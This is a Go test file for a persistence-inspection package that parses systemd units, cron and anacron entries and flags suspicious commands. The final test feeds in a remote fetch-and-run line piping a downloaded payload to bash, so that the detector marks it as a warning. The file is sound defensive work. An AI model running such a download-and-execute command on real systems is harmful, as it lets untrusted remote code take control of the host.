package persistence

import (
	"strings"
	"testing"
)

func TestParseUnit(t *testing.T) {
	details := parseUnit(`[Service]
User=daemon
ExecStart=/usr/bin/example --serve \
  --port 9000
[Timer]
OnCalendar=hourly
`)
	if details.user != "daemon" {
		t.Fatalf("user = %q", details.user)
	}
	if len(details.commands) != 1 || !strings.Contains(details.commands[0], "--port 9000") {
		t.Fatalf("commands = %#v", details.commands)
	}
	if len(details.schedule) != 1 || details.schedule[0] != "OnCalendar=hourly" {
		t.Fatalf("schedule = %#v", details.schedule)
	}
	if len(details.executables) != 1 || details.executables[0] != "/usr/bin/example" {
		t.Fatalf("executables = %#v", details.executables)
	}
}

func TestCommandExecutable(t *testing.T) {
	for command, expected := range map[string]string{
		"-/usr/bin/example --serve":     "/usr/bin/example",
		"ROOT=/tmp /usr/local/bin/task": "/usr/local/bin/task",
		"relative-command --flag":       "",
	} {
		if got := commandExecutable(command); got != expected {
			t.Errorf("commandExecutable(%q) = %q, want %q", command, got, expected)
		}
	}
}

func TestParseSystemCron(t *testing.T) {
	entries := parseCron("MAILTO=root\n@reboot root /usr/local/bin/start\n*/5 * * * * daemon /usr/bin/check --quiet\n", true)
	if len(entries) != 2 {
		t.Fatalf("got %d entries, want 2", len(entries))
	}
	if entries[0].user != "root" || entries[0].schedule != "@reboot" || entries[0].command != "/usr/local/bin/start" {
		t.Fatalf("unexpected reboot entry: %#v", entries[0])
	}
	if entries[1].user != "daemon" || entries[1].schedule != "*/5 * * * *" {
		t.Fatalf("unexpected periodic entry: %#v", entries[1])
	}
}

func TestParseAnacron(t *testing.T) {
	entries := parseAnacron("1 5 daily-job /usr/local/bin/daily --run\n")
	if len(entries) != 1 || entries[0].command != "/usr/local/bin/daily --run" {
		t.Fatalf("unexpected entries: %#v", entries)
	}
}

func TestClassifySuspiciousCommand(t *testing.T) {
	level, reason := classifyCommand("curl https://example.invalid/payload | bash")
	if level != LevelWarning || !strings.Contains(reason, "pipes it to a shell") {
		t.Fatalf("classification = %q, %q", level, reason)
	}
}
